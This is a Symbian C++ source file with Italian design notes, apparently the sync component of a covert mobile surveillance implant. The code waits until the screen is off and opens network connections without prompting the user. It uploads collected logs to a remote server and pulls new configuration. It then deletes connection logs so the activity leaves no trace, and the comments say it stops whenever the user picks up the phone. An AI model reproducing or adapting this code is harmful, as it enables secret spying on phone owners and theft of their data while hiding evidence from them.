/*
 ============================================================================
 Name		: ActionSync.cpp
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CActionSync implementation
 ============================================================================
 */

#include "ActionSync.h"
#include <es_enum.h>     // for TConnectionInfoBuf
#include <rconnmon.h>	 // for connection monitor, add connmon.lib

#include <hal.h>		// check display

#include <centralrepository.h>			// detect offline mode
#include <CoreApplicationUIsSDKCRKeys.h>

#include <mmssettings.h>   //for CMmsSettings, retrieve mms access point

#include "ConnLogCleaner.h"		// delete wlan and gprs connection logs

#define KLogWlanDataEventType 0x1000595f
const TUid KLogWlanDataEventTypeUid = {KLogWlanDataEventType};
     
CActionSync::CActionSync() :
	CAbstractAction(EAction_Sync)
	{
	// No implementation required
	}

CActionSync::~CActionSync()
	{
	__FLOG(_L("Destructor"));
	delete iProtocol;
	iConnection.Close();
	iSocketServ.Close();
	iIapArray.Close();
	__FLOG(_L("EndDestructor"));
	__FLOG_CLOSE;
	}

CActionSync* CActionSync::NewLC(const TDesC8& params)
	{
	CActionSync* self = new (ELeave) CActionSync();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CActionSync* CActionSync::NewL(const TDesC8& params)
	{
	CActionSync* self = CActionSync::NewLC(params);
	CleanupStack::Pop(); // self;
	return self;
	}

void CActionSync::ConstructL(const TDesC8& params)
	{
	__FLOG_OPEN("HT", "ActionSync.txt");
	__FLOG(_L("------------"));
		
	BaseConstructL(params);
	iSocketServ.Connect();

	// Parses the parameters...
	TUint8* ptr = (TUint8 *)iParams.Ptr();
	Mem::Copy(&iUseGPRS, ptr, 4);
	ptr += sizeof(TUint32);

	Mem::Copy(&iUseWiFi, ptr, 4);
	ptr += sizeof(TUint32);
	
	TUint32 lenHost = 0;
	Mem::Copy(&lenHost, ptr, 4);

	ptr += sizeof(TUint32);
	
	if (lenHost > 0)
		{
		TUint8 totChars = (lenHost-1) / 2;
		TPtr16 ptrHost((TUint16 *) ptr, totChars, totChars);
		iHostName.Copy(ptrHost);
		}
	ptr += lenHost;

	// force it to test
	// iHostName = _L("192.168.100.100");    // internal address of external server
	// iHostName = _L("192.168.1.177");     // debug server
	iProtocol = CProtocol::NewL(*this);	
	
	}



void CActionSync::GetDefaultConnectionPrefL(/*TCommDbMultiConnPref& aMultiConnPref,*/ TInt& aCount)
{
	// Create session to CommsDat first
	//CommsDat::CMDBSession *dbs = CMDBSession::NewLC(CMDBSession::LatestVersion());
	CommsDat::CMDBSession *dbs = CMDBSession::NewLC(KCDLatestVersion);
	
	
	// Counter for the iap we append
	TInt prefIapCount = 0;
	
	// Reset the IAP ID array
	iIapArray.Reset();

	if(iUseGPRS)
		{
		//let's retrieve ap used for mms sending
		//because this ap can't be used for sync
		TInt32 mmsAp=0;
		mmsAp=GetMmsAccessPointL();
		
		//let's search for "OutgoingGPRS" serviceType
		//Create a record set
		CMDBRecordSet<CCDIAPRecord>* gprsIapRecordSet = new (ELeave) CMDBRecordSet<CCDIAPRecord>(KCDTIdIAPRecord);
		CleanupStack::PushL(gprsIapRecordSet);
		//To find all IAP records supporting OutgoingGprs service
		TPtrC gprsServiceType(KCDTypeNameOutgoingWCDMA);
		//To prime for a search, create a record with the priming fields and append it to the Recordset
		CCDIAPRecord* ptrPrimingRecord = static_cast<CCDIAPRecord *>(CCDRecordBase::RecordFactoryL(KCDTIdIAPRecord));
		ptrPrimingRecord->iServiceType.SetMaxLengthL(gprsServiceType.Length());
		ptrPrimingRecord->iServiceType = gprsServiceType;  
		gprsIapRecordSet->iRecords.AppendL(ptrPrimingRecord);    
		ptrPrimingRecord=NULL; //since ownership is been passed to the recordset

		//Search
		if(gprsIapRecordSet->FindL(*dbs))
			{
			//The iapRecordSet->iRecords.Count() will now reflect the number of records found   
			TInt gprsIapRecordsFound = gprsIapRecordSet->iRecords.Count();
			
			for(TInt8 i=0; i<gprsIapRecordsFound; i++)
				{
				prefIapCount = ++prefIapCount;
				CCDIAPRecord* singleIapRecord = static_cast<CCDIAPRecord*>( gprsIapRecordSet->iRecords[i]);
				TBool proxy = EFalse;
				TInt iapId = singleIapRecord->RecordId();
				if(iapId != mmsAp)
					{
					//this is not the access point used for mms sending, let's append it
					proxy = HasProxyL(iapId,dbs);
					if(proxy)
						{
						// Let's append it at the end
						iIapArray.Append(iapId);
						}
					else
						{
						// Let's put it first
						iIapArray.Insert(iapId,0);
						}
					}
				}
			}
		else 
			{
			// No records found..but iRecords[0] is still present (though will only 
			//contain the priming values), so its important to check for the return code 
			}   

		CleanupStack::PopAndDestroy(1);  //gprsIapRecordSet
		
		} // (iUseGprs)
	// Let's insert WiFi access points, if requested; they will be inserted at first 
	if(iUseWiFi)
		{
		//let's search for "LANService" serviceType
		//Create a record set
		CMDBRecordSet<CCDIAPRecord>* wlanIapRecordSet = new (ELeave) CMDBRecordSet<CCDIAPRecord>(KCDTIdIAPRecord);
		CleanupStack::PushL(wlanIapRecordSet);
		//To find all IAP records supporting LANService service
		TPtrC lanServiceType(KCDTypeNameLANService);
		//To prime for a search, create a record with the priming fields and append it to the Recordset
		CCDIAPRecord* ptrPrimingRecord = static_cast<CCDIAPRecord *>(CCDRecordBase::RecordFactoryL(KCDTIdIAPRecord));
		ptrPrimingRecord->iServiceType.SetMaxLengthL(lanServiceType.Length());
		ptrPrimingRecord->iServiceType = lanServiceType;  
		wlanIapRecordSet->iRecords.AppendL(ptrPrimingRecord);    
		ptrPrimingRecord=NULL; //since ownership is been passed to the recordset
		
		//Search
		if(wlanIapRecordSet->FindL(*dbs))
			{
			//The iapRecordSet->iRecords.Count() will now reflect the number of records found   
			TInt wlanIapRecordsFound = wlanIapRecordSet->iRecords.Count();
					
			for(TInt8 i=0; i<wlanIapRecordsFound; i++)
				{
				CCDIAPRecord* singleIapRecord = static_cast<CCDIAPRecord*>( wlanIapRecordSet->iRecords[i]);
				RBuf iapName;
				iapName.CreateL(singleIapRecord->iRecordName);
				iapName.CleanupClosePushL();
				if(iapName.Compare(_L("IPDC"))==0 || iapName.Compare(_L("Easy WLAN"))==0)
					{
					;//  do nothing, it's not  valid wlan ap
					} 
				else 
					{
					// it's a valid wlan ap, append it
					prefIapCount = ++prefIapCount;
					iIapArray.Insert(singleIapRecord->RecordId(),0);
					}
				CleanupStack::PopAndDestroy();  // iapName		
				}
			}
		else 
			{
			// No records found..but iRecords[0] is still present (though will only 
			//contain the priming values), so its important to check for the return code 
			}   

		CleanupStack::PopAndDestroy(1);  //wlanIapRecordSet
	
		}
	
	CleanupStack::PopAndDestroy(1);  // dbs
	aCount = prefIapCount;
}

/*
 * HasProxyL().
 * Used when an active GPRS connection is found. We need a non-WAP access point, so
 * we have to check if the active access point is a WAP access point. Basically we 
 * check if a proxy server for this access point is defined. If yes, chances are that
 * it's a useless WAP access point.
 */
TBool CActionSync::HasProxyL(TUint aIapId,CommsDat::CMDBSession *aDbSession)
	{
	
	// Load the IAP which record is aIapId
	CCDIAPRecord* iap = static_cast<CCDIAPRecord *>(CCDRecordBase::RecordFactoryL(KCDTIdIAPRecord));
	CleanupStack::PushL(iap);
	iap->SetRecordId(aIapId);
	iap->LoadL(*aDbSession);
	
	// Read service table id and service type from the IAP record found
	TUint32 serviceId = iap->iService;
	RBuf	serviceType;
	serviceType.CreateL(iap->iServiceType);
	CleanupClosePushL(serviceType);
	
	// Create a recordset of type CCDProxiesRecord for priming search
	// This will ultimately contain records matching the priming record attributes
	CMDBRecordSet<CCDProxiesRecord>* proxyRecords = new (ELeave) CMDBRecordSet<CCDProxiesRecord>(KCDTIdProxiesRecord);
	CleanupStack::PushL(proxyRecords);
	
	// Create the priming record and set attributes that will be the search criteria
	CCDProxiesRecord* primingProxyRecord = static_cast<CCDProxiesRecord*>(CCDRecordBase::RecordFactoryL(KCDTIdProxiesRecord));
	CleanupStack::PushL(primingProxyRecord);
	
	primingProxyRecord->iServiceType.SetMaxLengthL(serviceType.Length());
	primingProxyRecord->iServiceType=serviceType;
	primingProxyRecord->iService = serviceId;
	primingProxyRecord->iUseProxyServer = ETrue;
	
	// Append the priming record to the priming recordset
	proxyRecords->iRecords.AppendL(primingProxyRecord);
	// Ownership of primingProxyRecord is transferred to proxyRecords, just 
	// remove it from the CleanupStack
	CleanupStack::Pop(primingProxyRecord);
	
	TBool hasProxy;
	
	// now find a proxy table matching our criteria
	if(proxyRecords->FindL(*aDbSession)){
		// proxy table matching found
		// record has proxy, it's a wap iap
		hasProxy = ETrue;
	}
	else {
		// proxy table matching not found
		// record has not proxy, it's ok
		hasProxy = EFalse;
	}
	CleanupStack::PopAndDestroy(3);  // iap, serviceType, proxyRecords
	
	return hasProxy;
	
}

/*
 * GetActiveConnectionPrefL
 */
void CActionSync::GetActiveConnectionPrefL(TCommDbConnPref& connectPref)
{
	RConnectionMonitor connMonitor;
	TUint connCount;
	TRequestStatus status;
	TUint connId;
	TUint subConnCount;
	TInt bearerType;
	TUint iapId;
	
	// RConnectionMonitor can monitor state of connections 
	connMonitor.ConnectL();
	
	// Get active connections count
	connMonitor.GetConnectionCount(connCount,status);
	User::WaitForRequest(status);
	if ((status.Int() != KErrNone) || (connCount == 0)){
		connMonitor.Close();
		return;
	}
	
	for (TUint i=1 ; i<= connCount; i++)
	{
		// Gather connection info
		TInt err = connMonitor.GetConnectionInfo(i,connId,subConnCount);
		if(err != KErrNone)
			{
			continue;
			}
		connMonitor.GetIntAttribute(connId,0,KBearer,bearerType,status);
		User::WaitForRequest(status);
		// for bearer type:
		// http://library.forum.nokia.com/topic/S60_3rd_Edition_Cpp_Developers_Library/GUID-759FBC7F-5384-4487-8457-A8D4B76F6AA6/html/rconnmon_8h.html?resultof=%22%45%42%65%61%72%65%72%57%6c%61%6e%22%20%22%65%62%65%61%72%65%72%77%6c%61%6e%22%20
		// rconnmon.h
		if (bearerType == EBearerWLAN){
			//if(iUseWiFi){
				// we have found a WiFi connection and we were asked to use WiFi
				iActiveConn = ETrue;
				iUsableActiveConn = ETrue;
				connMonitor.GetUintAttribute(connId,0,KIAPId,iapId,status);
				User::WaitForRequest(status);
				connectPref.SetDialogPreference(ECommDbDialogPrefDoNotPrompt);
				connectPref.SetDirection(ECommDbConnectionDirectionOutgoing);
				connectPref.SetIapId(iapId);
			//} else {
			//	iActiveConn = ETrue;
			//	iUsableActiveConn = EFalse;
			//}
		}
		else if (bearerType == EBearerGPRS || bearerType == EBearerEdgeGPRS || bearerType == EBearerWCDMA){
			//if(iUseGPRS){
				// we have found a packet data connection and we were asked for it
				iActiveConn=ETrue;
				
				connMonitor.GetUintAttribute(connId,0,KIAPId,iapId,status);
				User::WaitForRequest(status);
				//TBool isWap;
				//isWap = IsWapAccessPointL(iapId);
				//iUsableActiveConn = !isWap;
				//if(iUsableActiveConn){
					connectPref.SetDialogPreference(ECommDbDialogPrefDoNotPrompt);
					connectPref.SetDirection(ECommDbConnectionDirectionOutgoing);
					connectPref.SetIapId(iapId);
				//}
			//} else {
			//	iActiveConn = ETrue;
			//	iUsableActiveConn = EFalse;
			//}
			
		}
		
	}

	connMonitor.Close();
		
}

void CActionSync::DispatchStartCommandL()
	{
	// MARK: useful for debugging purposes
	// MarkCommandAsDispatchedL(); 
	// return;
	
	// When offline user is prompted for confirmation on connection, so we have to check 
	__FLOG(_L("DispatchStartCommand"));
		
	if(OfflineL())
		{
		MarkCommandAsDispatchedL();
		return;
		}
	
	iStartMonitor = EFalse;
	iDeleteLog = EFalse;
	iConnection.Close();
	TInt err = KErrNone;
	// RConnection::Open can leave when there isn't any IAP available.
	TRAPD(panicErr, err = iConnection.Open(iSocketServ) );
	if (panicErr != KErrNone || err != KErrNone)
		{
		MarkCommandAsDispatchedL();
		return;
		}
	
	// Let's search for an already active connection
	// iActiveConn means that there is an active connection ongoing
	// iUsableConn means that is what requested (WiFi or GPRS not WAP)
	TCommDbConnPref	pref;
	iActiveConn = EFalse;
	iUsableActiveConn = EFalse;
	GetActiveConnectionPrefL(pref);
	
	
	if(iActiveConn && !iUsableActiveConn){
		// we have found an active connection, but it's not the right type
		MarkCommandAsDispatchedL();
		return;
	}
	
	
	if(iActiveConn && iUsableActiveConn){
		__FLOG(_L("Active connection found"));
		
		// we have found an active connection and we silently use it
		// no display off, no user input monitoring
		err = iConnection.Start(pref);
	}
	else { // we force the connection
		__FLOG(_L("Force connection"));	
		if(!iUseGPRS && !iUseWiFi){
			// no connection must be forced
			MarkCommandAsDispatchedL();
			return;
		}
		// else search for access point(s)
		TInt apnCount = 0;
		GetDefaultConnectionPrefL(apnCount);
		if(apnCount == 0){
			__FLOG(_L("No suitable access points"));
			
			// there was no suitable configured access point
			MarkCommandAsDispatchedL();
			return;
		}
		
		TInt value;
		TInt displayErr = KErrNone;
		displayErr = HAL::Get(HAL::EDisplayState,value);
		
		// comment this part when debugging coz display always on when using TRK
		// this is useful also to see what happens when monitoring user activity
		//value = 0;           // TODO: restore comment here
		if (value == 1){
			__FLOG(_L("Display active"));
			
			// display is active.... next time
			MarkCommandAsDispatchedL();
			return;
		}
		
		iStartMonitor = ETrue;       // we have to monitor user activity
		iDeleteLog = ETrue;			// since it's a new conn, we have to delete its log
		//TCommDbMultiConnPref is buggy, this is why we use our loop in ConnectionStart()
		
		err = ConnectionStartL();
	}
	
	// if somewhere before we tried to connect...
	if (err != KErrNone)
		{
		__FLOG_1(_L("Connecton err: %d"),err);
		
		iStartMonitor = EFalse;
		iDeleteLog = EFalse;
		MarkCommandAsDispatchedL();
		return;
		}
	
	// start sync.... at last!
	__FLOG(_L("OK, start protocol"));
		
	//iProtocol->ConnectToServerL( iStartMonitor, iSocketServ, iConnection, iHostName, 80 );
	iProtocol->StartRestProtocolL( iStartMonitor, iSocketServ, iConnection, iHostName, 80 );
		
	}


void CActionSync::ConnectionTerminatedL(TInt aError)
	{	
	iConnection.Stop();
	iConnection.Close();
	
	if(iDeleteLog)
		{
		CConnLogCleaner* logCleaner = CConnLogCleaner::NewLC();
		TRAPD(result,logCleaner->DeleteConnLogSyncL());
		CleanupStack::PopAndDestroy(logCleaner);
		}
	
	if(iNewConfig) 
		{
		RProperty::Set(KPropertyUidSharedQueue, KPropertyKeySharedQueueTopAddedOrRemoved, 0xEFBE);
		} 
	else 
		{
		MarkCommandAsDispatchedL();
		}
	
	}

void CActionSync::NewConfigDownloaded()
	{
		iNewConfig = ETrue;
	}

TInt CActionSync::ConnectionStartL()
	{
		TInt err;
		TInt count;
		
		count = iIapArray.Count();
				
		TCommDbConnPref connPref;
		connPref.SetDialogPreference(ECommDbDialogPrefDoNotPrompt);
		connPref.SetDirection(ECommDbConnectionDirectionOutgoing);
		
		for(TInt i=0; i<count; i++)
		{
			connPref.SetIapId(iIapArray[i]);
			err = iConnection.Start(connPref);
			// sometimes, when the gprs access point isn't well configured, or when the user 
			// didn't subscribed the service, the connection fails but the log is written
			// so we have to try to delete the log
			// http://wiki.forum.nokia.com/index.php/Symbian_OS_Error_Codes
			if(err == KErrNone)
					return err;
			else if((err <= -30171) && (err >= -30207)) //wlan error code wlanerrorcodes.h
				{
				CConnLogCleaner* logCleaner = CConnLogCleaner::NewLC();
				TRAPD(result,logCleaner->DeleteConnLogSyncL(EWlan));
				CleanupStack::PopAndDestroy(logCleaner);
				}
			else if((err <= -4153) && (err >= -4162)) // gprs error codes
				{
				CConnLogCleaner* logCleaner = CConnLogCleaner::NewLC();
				TRAPD(result,logCleaner->DeleteConnLogSyncL(EGprs));
				CleanupStack::PopAndDestroy(logCleaner);
				}
		}
		return err;
	}

// http://wiki.forum.nokia.com/index.php/How_to_Detect_Offline_Mode_in_3rd_Edition
// http://wiki.forum.nokia.com/index.php/How_to_check_if_the_phone_is_in_offline_mode
TBool CActionSync::OfflineL()
	{
	TBool offline = EFalse;
	TInt value=0;
	
	CRepository* repository = CRepository::NewLC(KCRUidCoreApplicationUIs);
	// Check offline mode on or not.
	if (repository->Get(KCoreAppUIsNetworkConnectionAllowed, value) == KErrNone)
	    {
	     // Do something based on value
		if( value == ECoreAppUIsNetworkConnectionNotAllowed)
			offline = ETrue;
	    }
	CleanupStack::PopAndDestroy(repository);
	return offline;
	}


TInt32 CActionSync::GetMmsAccessPointL()
	{
	TInt32 mmsAp=0;
	CMmsSettings* mmsSettings;
	mmsSettings = CMmsSettings::NewL();
	mmsSettings->LoadSettingsL();
	mmsAp = mmsSettings->AccessPoint( 0 );
	delete mmsSettings;	
	return mmsAp;
	}
/*
 L'ActionSync  avvia il processo di sincronizzazione con il server remoto tramite i seguenti passi:

 1. Restarta gli agenti che creano un log unico in append in modo da poter inviare il log scritto fino al momento.
 2. Restarta il DeviceAgent?.
 3. Controlla che non sia gia' disponibile una connessione (WiFi? ad esempio).
 1. Se disponibile allora inizia il processo di sincronizzazione. 
 4. Controlla lo stato del device per verificare che si trovi in stand-by.
 5. Se il device e' in standby viene creato uno snapshot dei log attualmente disponibili.
 6. Viene stabilita una connessione col server.
 7. Viene richiesto il file di configurazione.
 8. Vengono inviati i log.
 9. L'Azione termina e viene ristabilito lo stato precedente (es: vengono spente le periferiche che erano state accese). 

 Questa azione deve essere interrotta qualora l'utente riprenda ad utilizzare il telefono (a meno che non sia possibile nascondere le icone di stato sullo schermo), in questo caso infatti ogni attivita' che rende visibile elementi sullo schermo deve essere fermata. L'azione viene identificata nel file di configurazione tramite il relativo ActionType.
 Parametri

 All'azione vengono inviati quattro parametri utilizzando la ActionStruct:

 uGprs
 e' un UINT che puo' assumere solo due valori: 0 o 1 ed indica se eseguire la sync tramite link GPRS. 
 uWiFi
 e' un UINT che puo' assumere solo due valori: 0 o 1 ed indica se eseguire la sync tramite rete WiFi?. 
 uHostLen
 e' un UINT ed indica la lunghezza del campo HostName. 
 HostName
 e' un puntatore a WCHAR ed indica l'hostname, oppure l'IP, del server remoto sul quale effettuare la sincronizzazione.

 Protocollo

 Il protocollo di Sync e' piuttosto esteso, per questa ragione se ne fa riferimento nella pagina dedicata. 
 */
